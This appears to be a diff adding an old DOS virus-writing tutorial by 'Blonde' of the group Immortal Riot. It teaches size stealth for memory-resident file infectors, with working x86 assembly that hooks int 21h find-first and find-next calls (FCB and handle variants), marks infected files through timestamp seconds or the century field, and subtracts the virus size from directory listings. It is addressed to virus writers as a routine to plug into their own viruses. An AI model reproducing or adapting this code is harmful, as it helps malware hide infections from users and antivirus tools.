@@ -1,0 +1,291 @@
+% Size-stealth by Blonde %
+컴컴컴컴컴컴컴컴컴컴컴컴컴
+Here's a *messy* tutorial written ages ago by Blonde. It contained
+a few errors, which is pretty bad for a tutorial :-), I erased one
+or two, but if you still find a few bugs, deal with it.
+
+A few things could be commented better, such as the determination-
+technique for fcb-types, however, I've now fixed that up, so be happy :).
+
+Maybe there is no reason for a semi-stealth tutorial since pretty much
+about everyone just rips another viruses stealth-routine, alters the
+infection-check and plugs it in... So it's for those people or for the
+ones who can write a memory resident infector, but have no clue of how
+to stealth the size-increase the virus causes when infecting (Except
+for the 00-fillers, of course), enjoy.
+
+- The Unforgiven.
+
+
+
+
+            - Size stealth using FCB and Handles -
+               Written by Blonde/Immortal Riot
+
+
+
+
+
+
+Many new resident viruses include atleast some stealth features, well
+almost all if hiding from dos's mem.com is considered as stealth ;).
+But in this  article I'll go through the basic size stealth. Some of you
+(or most of you ;))  already know how to write a size-stealth routine,
+but there is always someone  who doesn't. I remember when I tried to
+write it without a clue on how to do it...
+
+Size-Stealth:
+*************
+
+I guess the concept is quite clear ;). It's basically hiding the files
+increase in size when it's infected by our virus. To do that you have to
+be resident of course, but you can't do anything about that, except make
+the virus a fast replicator ;)
+
+Okey, well first of all you have to mark the infected file somehow. Most
+writers choose to mark the seconds in the time stamp, since they're
+seldomly used. You *can* of course open the file and check your jmp or
+id-marker, but doing it that way would slow down the filesearch in
+a large directory a lot. Thats why its easier(and better) mark the time
+stamp!
+
+You can mark the file as you like, but this is how I generally do. Just
+before you're about to restore the time/date stamp of the file just alter
+CX to hold it. Preferably without altering the hour/min's...
+
+;CX=time stamp...
+
+and cl,11100000b         ;this will zero-out the seconds field since
+                         ;it's the last 5 bits.
+or cl,01110b             ;this set this files seconds field to 01110b
+                         ;=14 (28 seconds) = our specific stealth-marker.
+
+This is good because it's easy to check if the file was marked by us,
+simply get the timestamp in ax and do an AND al,00011111b followed by a
+XOR al,01110b to get al=0 IF the file was marked by us...
+
+We could also mark the time-stamp with the century method. The century
+method is as simple as the seconds method... just add another 100 years
+to the year field and remove them in the resident stealth routine, this
+method is good if you've got a mbr infector or something like it,
+because if the virus isn't in the memory this method will generate
+TBAV's 'T'-flag and probably trigger F-Prot too. But on the other
+hand, no program will be stealthed without being infected... adding
+another century could be done like this...
+
+;DX=date stamp
+
+add dh,c8h              ;this add 100 years to the yearfield it's
+                        ;year-1980=bit 15-9 in dx...
+                        ;0c8h = 100 shl 1, since it's shifted left
+                        ;once
+
+To detect this at stealth time simply do a cmp dh,0c8h and if it's
+below then it can't be infected by us... simple right? BUT you'll have
+to stealth the date too so just do a sub dh,0c8h when you stealth the size...
+this might have been a bit fuzzy, if so stick to
+the seconds method ;).
+
+Say we've marked all our infected files by setting the seconds field
+to 01110b How do we hide the size then? And from what do we hide them?
+
+Well we want to hide them from file searches, atleast thats what I'm
+teaching you ;). And DOS mainly provide two ways to search for files,
+via FCB or via file handles. The file handles have been recommended to
+use since DOS version 2+ or something, yet DIR still uses the FCB so
+today we'll have to hide from both of them to get enough coverage, but
+who knows we might be able too lose those FCB's in a future since DOS
+v7.0+ shall use handles ;)
+
+We simply add 11h/12h (FCB's) and 4e/4f (Handles) to our interrupt 21h
+handler. Yes, you'll have to hook int 21h by yourself ;)
+It can look something like this:
+
+new_int21h:
+.
+.
+.
+.
+cmp ah,11h
+jz  stealth_fcb
+cmp ah,12h
+jz stealth_fcb
+cmp ah,4eh
+jz stealth_handle
+cmp ah,4fh
+jz stealth_handle
+jmp dword ptr cs:[Oldint21h]
+
+11h and 4Eh is basicly find first and 12h/4Fh is find next, that
+should be a problem... make the 11h/12h point to one routine and
+4Eh/4Fh to another.
+
+We'll start with the FCB routine since it's a bit more complicated...
+
+
+
+Stealth_Fcb:            ;jmp here from int-hook...
+
+pushf
+push cs
+call org21h             ;This will fake a call to the real int 21h
+                        ;because else we would not know what to steath.
+                        ;on return ds:dx point to unopened FCB
+
+or al,al                ;since 11h/12h doesn't set carry flag on error
+jnz stealth_error       ;we'll check that the error code=0=no-error
+                        ;or al,al is a smaller variant of cmp al,0 btw!
+
+push ax bx es           ;save them because we'll alter them
+
+mov ah,51h              ;get current psp, ah=62h is also ok.
+int 21h                 ;returns segment of current psp in bx
+
+mov es,bx               ;es=bx=current psp
+cmp bx,es:[16h]         ;this is to check if it's DOS calling,
+jne dont_stealth        ;we does this to not screw up programs like
+                        ;chkdsk, this means; we stealth only on 'DIR'
+
+
+mov bx,dx               ;bx=offset to unopened FCB
+mov al,ds:[bx]          ;At the first offset of an unopened FCB the
+                        ;drive is stored if it's *not* an extended fcb
+                        ;if it's an extended-fcb, the value it FFh.
+                        ;(Everything is extended-fcb nowadays.. )
+
+push ax                 ;Save AX on the stack (It's FF or 0 )
+mov ah,2Fh              ;Get current DTA
+int 21h                 ;returns dta to es:bx
+pop ax                  ;Restore AX (Is FF or 0)
+
+inc ax                  ;By Inc AX, we and cmp for ZERO, we can notice
+                        ;if we're dealing with regular or extended FCB
+                        ;types. FFh+1=0, so, if it's *not* 0 after we
+                        ;increased AX (AX=AX+1), it's not zero, then its
+                        ;not an extended-FCB-type either.
+jnz regular_fcb
+
+add bx,7h               ;If extended, add 7 to bx, this is the ONLY difference
+                        ;between extended and regular FCB's, the extended has
+                        ;some extra bytes which would fuck up our offset if we
+                        ;didn't care...
+regular_fcb:
+mov ax,es:[bx+17h]      ;get time stamp from the DTA (es:bx pointer, 17h=adress)
+
+and al,00011111b        ;kill everything but seconds field
+xor al,01110b           ;xor with our timestamp
+jnz dont_stealth        ;if al isn't zero the file wasn't marked by us!
+                        ;check your logic book if you don't understand XOR!
+
+cmp word ptr es:[bx+1Dh],vsize+mininfectsize
+
+ja stealth              ;this is obvious, if it is large enough to be
+                        ;infect, stealth it...
+
+cmp word ptr es:[bx+1fh],0
+
+je dont_stealth         ;since COM-files cannot be over 64k, don't stealth
+                        ;files which are so large.
+
+stealth:
+sub word ptr es:[bx+1Dh],vsize          ;stealth it!
+;sbb word ptr es:[bx+1Fh],0         ;No need to stealth high-word for
+                                    ;COM-infectors only, Blonde :-).
+
+
+dont_stealth:
+pop es bx ax            ;restore these
+stealth_error:
+iret                                    ;return to the caller with or
+                        ;without stealth
+
+
+I guess this could be hard to get at the first view... but it's easy.
+First of all you fake an int call because you want something to
+stealth... then you get the current psp, no problems there... You check
+to see if it's dos calling. Then you move the byte at PSP:0 into al.
+That's because you must check if it's an extended FCB. The difference
+between  regular and extended is that an extended FCB also includes some
+DOS RESERVED areas which one must skip to get to the information you
+want... A fact is that the regular fcb is almost unused only dos versions
+prior to 4 used it. Then you get the address to the DTA, it's returned
+in es:bx, next check if it's an extended FCB and add 7 to bx if it is...
+(thats because of the reserved areas) then one stores the timestamp from
+the dta in ax.
+You then must and/xor al to see if your marker is there... if it isn't you
+bail. If it's there you check if the filesize isn't too small, note that
+you first have to check if the low word is larger than the virus if it is
+stealth it. If it's smaller then check the high word (ie. how many 64k
+block is it?), if it's zero then it's impossible to infect the file...
+
+If all thats a match we subtract the virus-size from the filesize at
+es:[bx+1Dh] (low word) and es:[bx+1fh] (high word)
+
+Finally we pop es/bx/ax and iret to the calling routine.
+
+And now to the handle routine, it's simpler than the FCB routine
+because all we need is the DTA... but I guess you already knew that ;)
+
+Stealth_Handles:
+
+pushf
+push cs
+call org21h                  ;still fake
+jc stealth_error             ;we can use this since 4e/4f sets the
+                             ;carry flag on error
+pushf
+push ax bx es                ;push the flags because they'll be altered by
+                             ;the int call
+mov ah,2fh
+int 21h                      ;get dta in es:bx
+
+mov ax,es:[bx+16h]           ;get time stamp
+
+and al,00011111b
+xor al,01110b
+jnz dont_stealth             ;If not zero, then file is not infected!
+
+cmp word ptr es:[bx+1Ah],vsize+minsize  ;check if file is too small?
+ja stealth
+cmp word ptr es:[bx+1Ch],0
+je dont_stealth              ;check if file is too large?
+
+stealth:
+sub word ptr es:[bx+1Ah],vsize          ;Substract code-lenght
+;sbb word ptr es:[bx+1Ch],0         ;Still no need to sub high-word..
+
+dont_stealth:
+pop es bx ax
+popf
+stealth_error:
+retf 2                       ;return far, pop 2 off stack (cs:ip)
+                             ;don't pop flags since they're may be
+                             ;altered by int call
+
+The handle-stealth routine should look really familiar ;) It's almost
+exactly the same as the FCB routine, but you don't have to bother about
+those extended fcbs and stuff, but I'll go through it anyway... but
+just on the points that differ from the fcb routine...
+
+The jump if carry can be used instead of that or al,al because 4e/4f
+set the carry flag on error...you must also pop the flags just because
+of that, the call might alter them in another way...
+Also get the dta and timestamp and check if it's yours and so on,
+but that shouldn't be a problem, just observe that all offsets change!
+
+We use a retf 2 because we don't want to pop the flags of the stack
+since we already done so by ourselfs...
+
+It's possible to smash these routines into one, well nearly.
+That can save valueable bytes. I won't bother going thru that here,
+but it's basiclly adding 3 to bx to get the right offset when doing the
+last part, look at my virus Salamander Four which is included at the end
+of this file. It's a com only infector so it'll look a little different
+since you don't have to worryabout the high word of the filesize since
+comfiles only can be 64kb's long...
+
+I guess this isn't the best explanation you could get, but it's all
+you'll get from me ;). I'll be happy to answer any questions
+concerning this matter or any other. I'm reachable at TWL/HNS or via
+Nukenet and I'm even on IRC sometimes...
+
